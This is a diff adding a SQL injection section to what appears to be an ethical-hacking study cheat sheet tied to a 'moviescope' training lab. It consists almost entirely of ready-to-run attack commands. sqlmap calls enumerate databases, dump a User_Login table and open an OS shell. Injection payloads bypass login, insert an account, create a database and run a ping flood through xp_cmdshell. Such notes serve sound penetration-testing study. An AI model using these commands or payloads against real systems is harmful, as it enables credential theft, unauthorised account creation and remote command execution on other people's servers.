@@ -236,3 +236,42 @@ adb pull /sdcard/log.txt C:
 adb pull sdcard/log. txt /home/murphy/Desktop
 ```
 </details>
+
+## SQL Injection
+
+<details>
+    <summary>SQL Injection</summary>
+    
+## Module 15: SQL Injection
+- ### SQLMAP Extract DBS
+- 
+```bash
+sqlmap -u “http://www.example.com/viewprofile.aspx?id=1” --cookie="xookies xxx" --dbs
+```
+- ### Extract Tables
+- 
+```bash
+sqlmap -u “http://www.example.com/viewprofile.aspx?id=1” --cookie="cookies xxx" -D moviescope --tables
+```
+- ### Extract Columns
+```bash
+sqlmap -u “http://www.example.com/viewprofile.aspx?id=1” --cookie="cookies xxx" -D moviescope -T User_Login --columns
+```
+- ### Dump Data
+```bash
+sqlmap -u “http://www.example.com/viewprofile.aspx?id=1” --cookie="cookies xxx" -D moviescope -T User_Login --dump
+```
+- ### OS Shell to execute commands
+sqlmap -u “http://www.example.com/viewprofile.aspx?id=1” --cookie="cookies xxx" --os-shell
+```
+- ### Login bypass
+```bash
+blah' or 1=1 --
+Insert data into DB from login
+blah';insert into login values ('john','apple123');
+Create database from login
+blah';create database mydatabase;
+Execute cmd from login
+blah';exec master..xp_cmdshell 'ping www.moviescope.com -l 65000 -t'; --
+```
+</details>
